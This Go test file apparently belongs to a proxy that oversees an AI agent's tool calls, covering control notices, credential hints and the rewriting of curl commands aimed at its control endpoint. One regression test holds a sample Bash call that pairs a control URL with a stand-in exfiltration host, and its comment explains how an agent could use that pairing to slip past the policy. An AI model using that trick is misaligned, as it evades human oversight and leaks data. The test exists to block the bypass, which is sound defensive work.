package llmproxy

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/clawvisor/clawvisor/internal/runtime/conversation"
)

func TestControlNoticeUsesAvailableShellToolNames(t *testing.T) {
	notice := ControlNotice("http://localhost:25297", []string{"read", "edit", "write", "exec", "process"})

	if !strings.Contains(notice, "Use `exec` with curl") {
		t.Fatalf("notice should steer OpenClaw to its actual shell tool; got:\n%s", notice)
	}
	if !strings.Contains(notice, `"tool_name":"exec"`) {
		t.Fatalf("notice example should declare exec in expected_tools_json; got:\n%s", notice)
	}
	if strings.Contains(notice, "Use Bash with curl") || strings.Contains(notice, `"tool_name":"bash"`) {
		t.Fatalf("notice should not hardcode Bash when exec is available; got:\n%s", notice)
	}
	if !strings.Contains(notice, "available tools (read, edit, write, exec, process)") {
		t.Fatalf("notice should show actual available tool examples; got:\n%s", notice)
	}
	if !strings.Contains(notice, "/control/vault/items") || !strings.Contains(notice, "required_credentials_json") {
		t.Fatalf("notice should explain credential discovery and declaration; got:\n%s", notice)
	}
	if !strings.Contains(notice, "ALLOWED WITHOUT A TASK") || !strings.Contains(notice, "Read files with `read`") {
		t.Fatalf("notice should disclose allowlisted read-only capabilities using actual tool names; got:\n%s", notice)
	}
	if !strings.Contains(notice, "Run one-shot read-only shell inspection with `exec`") {
		t.Fatalf("notice should disclose read-only shell inspection with actual shell tool name; got:\n%s", notice)
	}
}

func TestControlNoticeCredentialHintsAreBounded(t *testing.T) {
	notice := ControlNoticeWithCredentialHints("http://localhost:25297", []string{"Bash"}, []CredentialHint{
		{ID: "github.release", Label: "GitHub release bot"},
		{ID: "openai.work", Label: "OpenAI work key"},
	})
	if !strings.Contains(notice, "`github.release`: GitHub release bot") || !strings.Contains(notice, "`openai.work`: OpenAI work key") {
		t.Fatalf("notice should include small credential inventories; got:\n%s", notice)
	}
	if strings.Contains(strings.ToLower(notice), "secret value") {
		t.Fatalf("notice must not imply secret material is included; got:\n%s", notice)
	}

	var many []CredentialHint
	for _, id := range []string{"a", "b", "c", "d", "e", "f", "g", "h", "i", "j"} {
		many = append(many, CredentialHint{ID: "vault." + id, Label: "Vault " + id})
	}
	largeNotice := ControlNoticeWithCredentialHints("http://localhost:25297", []string{"Bash"}, many)
	if strings.Contains(largeNotice, "`vault.a`") {
		t.Fatalf("large credential inventories should use discovery endpoint instead of dumping labels; got:\n%s", largeNotice)
	}
	if !strings.Contains(largeNotice, "This user has many vault items") || !strings.Contains(largeNotice, "/control/vault/items") {
		t.Fatalf("large inventory notice should point to credential discovery; got:\n%s", largeNotice)
	}
}

// Regression: a curl invocation that mixes a synthetic control URL with
// any other outbound URL must be refused. Otherwise the rewriter would
// quietly rewrite only the control URL, and the model could run a
// second non-control fetch with the same curl call — bypassing policy
// while claiming control-plane status.
func TestRewriteControlToolUse_RejectsExtraOutboundURL(t *testing.T) {
	tu := conversation.ToolUse{
		ID:   "tu_1",
		Name: "Bash",
		Input: json.RawMessage(`{
			"command": "curl -sS https://clawvisor.local/control/tasks https://exfil.example/x"
		}`),
	}
	rewritten, _, ok, err := RewriteControlToolUse(tu, "https://clawvisor.example", "cv-nonce-fake")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if ok || rewritten != nil {
		t.Fatalf("multi-URL curl must not produce a control rewrite; got ok=%v rewritten=%s", ok, rewritten)
	}
}

// Sanity: a single control URL still rewrites and embeds the caller
// value verbatim (the postprocess path mints a nonce and passes it in).
func TestRewriteControlToolUse_EmbedsCallerValueVerbatim(t *testing.T) {
	tu := conversation.ToolUse{
		ID:   "tu_1",
		Name: "Bash",
		Input: json.RawMessage(`{
			"command": "curl -sS -X POST https://clawvisor.local/control/tasks --data '{\"purpose\":\"x\"}'"
		}`),
	}
	const minted = "cv-nonce-abc123"
	rewritten, _, ok, err := RewriteControlToolUse(tu, "https://clawvisor.example", minted)
	if err != nil || !ok {
		t.Fatalf("expected rewrite, got ok=%v err=%v", ok, err)
	}
	if !strings.Contains(string(rewritten), minted) {
		t.Errorf("rewritten command should include minted caller value; got %s", rewritten)
	}
	if strings.Contains(string(rewritten), "cvis_") {
		t.Errorf("rewritten command must not embed a raw cvis_ token; got %s", rewritten)
	}
}
